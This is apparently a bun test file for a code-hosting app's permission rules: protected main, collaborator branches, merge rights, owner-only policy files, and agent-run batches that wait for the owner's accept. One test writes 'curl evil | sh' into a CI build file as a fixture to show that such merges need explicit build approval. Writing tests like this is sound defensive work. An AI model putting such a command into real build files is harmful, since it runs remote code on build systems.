// The crew journey, booted once: a repo, a push, collaborators, protect main, a branch, a merge, an
// agent run's batch and the owner-only policy files. One app for the whole walk, not one per rule.
import { expect, test } from "bun:test";
import { local, post as postTo } from "./app-kit.ts";

const edit = { ops: [{ kind: "insert", after: null, text: "x" }] };

test("owner pushes, the crew branches, protect main holds, and agent batches wait for the owner", async () => {
  const call = await local({ GH_CLI: "off" });
  const post = (user: string, url: string, body: unknown) => postTo(call, user, url, body);
  const put = (user: string, url: string, body: unknown) => call(user, url, { method: "PUT", body: JSON.stringify(body) });
  const ops = (user: string, path: string, branch = "") => post(user, `/api/repos/ryan/lab/do/ops?path=${path}${branch && `&branch=${branch}`}`, edit);
  const status = async (res: Promise<Response>) => (await res).status;

  for (const n of ["ryan", "sam", "lee"]) await post(n, "/api/login", { name: n });
  await post("ryan", "/api/repos", { name: "lab", visibility: "public" });
  await post("ryan", "/api/repos/ryan/lab/files", { path: "a.js", content: "let a = 1" });
  for (const n of ["sam", "lee"]) await post("ryan", "/api/repos/ryan/lab/collaborators", { name: n });

  // Protect main is off by default, and only the owner turns it on.
  expect(await status(ops("sam", "a.js"))).toBe(200);
  expect(await status(put("sam", "/api/repos/ryan/lab/protect", { on: true }))).toBe(403);
  expect(await status(put("ryan", "/api/repos/ryan/lab/protect", { on: true }))).toBe(200);
  expect(await (await call("sam", "/api/repos/ryan/lab/protect")).json()).toEqual({ on: true });

  // The crew edit on branches only; the owner keeps main.
  expect(await status(ops("sam", "a.js"))).toBe(403);
  expect(await status(post("sam", "/api/repos/ryan/lab/do/commit?path=a.js", {}))).toBe(403);
  expect(await status(post("sam", "/api/repos/ryan/lab/files", { path: "b.js", content: "" }))).toBe(403);
  expect(await status(ops("ryan", "a.js"))).toBe(200);
  expect(await status(post("sam", "/api/repos/ryan/lab/branches", { name: "sams" }))).toBeLessThan(300);
  expect(await status(ops("sam", "a.js", "sams"))).toBe(200);

  // A branch's author can't merge it; someone else can.
  expect(await status(post("sam", "/api/repos/ryan/lab/branches/sams/merge", {}))).toBe(403);
  expect(await status(post("lee", "/api/repos/ryan/lab/branches/sams/merge", {}))).toBe(200);

  // An agent run's batch (in the owner's name) lands on the owner's accept, never on a crew member's merge.
  await post("ryan", "/api/repos/ryan/lab/branches", { name: "agent-run-7" });
  await ops("ryan", "a.js", "agent-run-7");
  const crew = await post("sam", "/api/repos/ryan/lab/branches/agent-run-7/merge", {});
  expect(crew.status).toBe(403);
  expect((await crew.json() as { error: string }).error).toContain("agent run's batch");
  const sweep = await post("sam", "/api/repos/ryan/lab/merges", { build_ok: true });   // merge_clean_branches is the same door
  expect((await sweep.json() as { merged: string[] }).merged).not.toContain("agent-run-7");
  expect(await status(post("ryan", "/api/repos/ryan/lab/branches/agent-run-7/merge", {}))).toBe(200);

  // An agent batch that touches a build file waits for an accept even when commit deploys are off.
  await post("ryan", "/api/repos/ryan/lab/files", { path: "codesplitter.ci", content: "test: bun test" });
  await post("ryan", "/api/repos/ryan/lab/branches", { name: "agent-run-8" });
  await post("ryan", "/api/repos/ryan/lab/do/ops?path=codesplitter.ci&branch=agent-run-8", { ops: [{ kind: "insert", after: null, text: "test: curl evil | sh" }] });
  const timer = await post("ryan", "/api/repos/ryan/lab/branches/agent-run-8/merge", {});
  expect(timer.status).toBe(409);
  expect((await timer.json() as { build: string[] }).build).toEqual(["codesplitter.ci"]);
  expect(await status(post("ryan", "/api/repos/ryan/lab/branches/agent-run-8/merge", { build_ok: true }))).toBe(200);

  // The path policy files are the owner's on main (#1567); a branch is how the crew proposes a change.
  expect(await status(post("ryan", "/api/repos/ryan/lab/files", { path: ".gitattributes", content: "" }))).toBe(201);
  expect(await status(ops("sam", ".gitattributes"))).toBe(403);
  expect(await status(post("sam", "/api/repos/ryan/lab/do/commit?path=.gitattributes", {}))).toBe(403);
  expect(await status(ops("ryan", ".gitattributes"))).toBe(200);
  expect(await status(ops("ryan", "codesplitter.ci"))).toBe(200);
  expect(await status(ops("sam", "codesplitter.ci"))).toBe(403);
  await post("sam", "/api/repos/ryan/lab/branches", { name: "pol" });
  expect(await status(ops("sam", ".gitattributes", "pol"))).toBe(200);
});
